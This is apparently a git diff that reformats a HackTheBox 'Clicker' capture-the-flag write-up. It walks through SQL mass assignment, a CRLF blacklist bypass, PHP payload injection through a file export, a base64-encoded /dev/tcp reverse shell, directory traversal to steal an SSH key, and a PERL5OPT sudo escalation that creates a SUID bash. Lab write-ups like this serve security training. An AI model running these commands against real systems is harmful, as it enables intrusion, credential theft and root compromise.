@@ -49,30 +49,31 @@ sudo umount $target:/mnt/backups
 
 ![admin.php](/HTB/Clicker/Screenshots/2023-12-19-11-45-44.png)
 
-```latex
-There's two ways to achieve that:
-- sql mass assignment
+
+```Theres two ways to achieve that:```
+- SQL mass assignment
 - CRLF vulnerability
-```
+
 
 [ABOUT: Mass assignment](https://learn.snyk.io/lesson/mass-assignment/)
 
 [ABOUT: CRLF](https://owasp.org/www-community/vulnerabilities/CRLF_Injection)
 
 ### sql mass assignment
-    
+
     role%3d'Admin',clicks=2000
-    By URL encoding the `=` we can insert more than one pair of values by seperating them with a comma.
+
+```By URL encoding the `=` we can insert more than one pair of values by seperating them with a comma.```
 
 ![mass assign](/HTB/Clicker/Screenshots/2023-12-19-11-54-07.png)
 
 ### CRLF vulnerability 
 
-    By adding %0a to `role` we can bypass the blacklist
+```By adding %0a to `role` we can bypass the blacklist```
 
 ![CRLF](/HTB/Clicker/Screenshots/2023-12-19-11-49-12.png)
 
-    Now if we relog we should be able to access the admin panel
+```Now if we relog we should be able to access the admin panel```
 
 ![Administration](/HTB/Clicker/Screenshots/2023-12-19-11-59-17.png)
 
@@ -84,7 +85,7 @@ There's two ways to achieve that:
 
 ![exporting php extension](/HTB/Clicker/Screenshots/2023-12-19-12-07-50.png)
 
-    As we can manipulate the extension of the exported file, we can change it to a php extension, and it's retrieving the nickname value, so we might try injecting a malicious payload and executing it through the export functionality.
+```As we can manipulate the extension of the exported file, we can change it to a php extension, and it's retrieving the nickname value, so we might try injecting a malicious payload and executing it through the export functionality.```
 
 ![php payload](/HTB/Clicker/Screenshots/2023-12-19-12-23-08.png)
 
@@ -92,15 +93,18 @@ There's two ways to achieve that:
 
 ![command execution](/HTB/Clicker/Screenshots/2023-12-19-12-23-28.png)
 
-    Now that we've tested that it's possible, time to get a reverseshell
+```Now that we've tested that it's possible, time to get a reverseshell```
 
 ```bash
 echo "sh -i >& /dev/tcp/<IP>/<PORT> 0>&1" | base64
 nc -lvnp <PORT>
 ```
 
-    send the payload:
-    echo <your base64 string> | base64 -d | bash
+```send the payload:```
+
+```bash
+echo <your base64 string> | base64 -d | bash
+```
 
 ![revshell](/HTB/Clicker/Screenshots/2023-12-19-12-27-25.png)
 
@@ -118,11 +122,11 @@ find / -type f -perm /u=s 2>dev/null
 
 ![Readme.txt](/HTB/Clicker/Screenshots/2023-12-19-13-02-55.png)
 
-    by running strace on execute_query 1 we can see a glimpse on what's going on behind the scenes.
+```By running strace on execute_query 1 we can see a glimpse on what's going on behind the scenes.```
 
 ![Strace for execute_query 1](/HTB/Clicker/Screenshots/2023-12-19-13-04-31.png)
 
-    we see that all these scripts are run from /home/jack/query/. Which means each number represents a file within that directory, so what happens when we provide a number out of the provided ones? - It doesn't find anything since nothing's specified. What if we specify a file ourselves? We already know there's an create.sql file within that directory let's try that.
+```we see that all these scripts are run from /home/jack/query/. Which means each number represents a file within that directory, so what happens when we provide a number out of the provided ones? - It doesn't find anything since nothing's specified. What if we specify a file ourselves? We already know there's an create.sql file within that directory let's try that.```
 
 ```bash
 ./execute_query 5 create.sql
@@ -130,15 +134,15 @@ find / -type f -perm /u=s 2>dev/null
 
 ![arbitrary file exec](/HTB/Clicker/Screenshots/2023-12-19-13-10-24.png)
 
-    It executes the same file as option 1 would. Let's try directory traversal.
+```It executes the same file as option 1 would. Let's try directory traversal.```
 
 ![/etc/passwd/](/HTB/Clicker/Screenshots/2023-12-19-13-11-43.png)
 
-    Works like a charm, however we need to be precise with the depth we go to. If we can read files we can surely read the id_rsa, since we caw that jack has ssh access within /etc/passwd aswell as we know port 22 is open.
+```Works like a charm, however we need to be precise with the depth we go to. If we can read files we can surely read the id_rsa, since we caw that jack has ssh access within /etc/passwd aswell as we know port 22 is open.```
 
 ![id_rsa](/HTB/Clicker/Screenshots/2023-12-19-13-13-51.png)
 
-    We'll copy it to our system and try to login, however if we're keen eyes we can see a minor issue with the file itself, it's formatting is busted. There needs to be 5 "-" on each side for it to be valid. 
+```We'll copy it to our system and try to login, however if we're keen eyes we can see a minor issue with the file itself, it's formatting is busted. There needs to be 5 "-" on each side for it to be valid. ```
 
 ```bash
 ssh jack@10.10.11.232 -i id_rsa
@@ -152,24 +156,23 @@ ssh jack@10.10.11.232 -i id_rsa
 
 ### Escalation to root
 
-    Check for sudo -l to list all sudo priviledges 
+```Check for sudo -l to list all sudo priviledges```
 
 ![sudo -l](/HTB/Clicker/Screenshots/2023-12-19-13-20-31.png)
 
 ![monitor.sh](/HTB/Clicker/Screenshots/2023-12-19-13-26-41.png)
 
-    We can set ENV variables when running sudo, and the script unsets perl libraries which jumps out as weird. Innitially I thought of PATH exploitation but that wouldn't work as the script resets the PATH variable.
-    So I was hung up on perl variables, xml_pp runs on perl, so I did some investigating and found a perl_start up local priv exploit:
+```We can set ENV variables when running sudo, and the script unsets perl libraries which jumps out as weird. Innitially I thought of PATH exploitation but that wouldn't work as the script resets the PATH variable. So I was hung up on perl variables, xml_pp runs on perl, so I did some investigating and found a perl_start up local priv exploit:```
 
 [Exim - 'perl_startup' Local Privilege Escalation](https://www.exploit-db.com/exploits/39702)
 
-    Essentially we're only interested in the payload:
+```Essentially we're only interested in the payload:```
 
 ```perl
 cmd_exec(%Q{PERL5OPT=-d PERL5DB='exec "#{c}"' exim -ps 2>&-})
 ```
 
-    Which essentally sets it to debug mode and runs a command, if we modify it to copy and set a SUID on bash we could get root.
+```Which essentally sets it to debug mode and runs a command, if we modify it to copy and set a SUID on bash we could get root.```
 
 ```bash
 mkdir -p /tmp/moon
@@ -177,7 +180,7 @@ sudo PERL5OPT=-d PERL5DB='exec "cp /bin/bash /tmp/moon/rootbash && chmod u+s /tm
 /tmp/moon/rootbash -p
 ```
 
-It's better to make a seperate rootbash rather than change the original bash to not disrupt anything and to make cleanup easy.
+```It's better to make a seperate rootbash rather than change the original bash to not disrupt anything and to make cleanup easy.```
 
 ![euid=root](/HTB/Clicker/Screenshots/2023-12-19-13-41-23.png)
 
